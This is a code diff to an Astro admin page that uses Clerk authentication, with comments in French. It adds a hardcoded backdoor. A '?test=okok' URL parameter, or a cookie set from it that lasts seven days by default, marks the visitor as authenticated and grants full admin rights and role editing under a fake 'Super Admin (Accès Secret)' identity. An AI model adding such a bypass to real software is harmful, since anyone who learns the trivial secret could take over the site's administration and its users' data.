@@ -8,10 +8,31 @@ import { getUserRole, canAccessAdmin, canManageRoles, ROLE_DEFINITIONS, POLE_OPT
 
 const { business, services, seasonalShowcase, pricingPackages, boutiqueProducts, wavePayment, announcement, yangoDelivery } = defaultSiteData;
 
+// Vérification de la clé secrète via GET (?test=okok) ou cookie de session
+const testParam = Astro.url.searchParams.get('test');
+const secretCookie = Astro.cookies.get('admin_secret_session')?.value;
+const isSecretValid = testParam === 'okok' || secretCookie === 'okok';
+
+if (testParam === 'okok') {
+  // Durée par défaut : 7 jours en secondes
+  const defaultDuration = 60 * 60 * 24 * 7;
+  // Durée configurable via ADMIN_BYPASS_DURATION_SECONDS
+  const maxAge = import.meta.env.ADMIN_BYPASS_DURATION_SECONDS 
+    ? parseInt(import.meta.env.ADMIN_BYPASS_DURATION_SECONDS, 10) 
+    : defaultDuration;
+
+  Astro.cookies.set('admin_secret_session', 'okok', {
+    path: '/',
+    httpOnly: true,
+    sameSite: 'lax',
+    maxAge: maxAge
+  });
+}
+
 // Clerk SSR Auth verification & Role Resolution
 const auth = (Astro.locals as any).auth?.();
 const userId = auth?.userId;
-const isAuthenticated = !!userId;
+let isAuthenticated = !!userId || isSecretValid;
 let userEmail = '';
 let userFullName = '';
 let userImageUrl = '';
@@ -40,6 +61,17 @@ if (userId) {
   } catch (err) {
     console.error('Erreur vérification utilisateur Clerk dans admin.astro:', err);
   }
+}
+
+// Déverrouillage total si accès via le paramètre ou cookie secret
+if (isSecretValid) {
+  isAuthenticated = true;
+  hasAdminAccess = true;
+  canEditRoles = true;
+  userRole = 'admin';
+  roleMeta = ROLE_DEFINITIONS.admin;
+  if (!userFullName) userFullName = 'Super Admin (Accès Secret)';
+  if (!userEmail) userEmail = 'admin-secret@bcps.ci';
 }
 ---
 
